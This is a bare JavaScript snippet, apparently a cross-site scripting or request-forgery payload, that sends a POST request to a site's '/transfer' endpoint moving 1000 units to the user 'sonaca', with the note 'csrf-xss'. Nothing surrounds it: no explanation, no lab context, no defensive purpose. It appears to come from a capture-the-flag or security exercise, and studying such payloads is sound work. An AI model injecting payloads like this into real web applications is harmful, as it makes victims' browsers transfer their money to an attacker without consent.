fetch('/transfer', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'to_username=sonaca&amount=1000&note=csrf-xss'
})
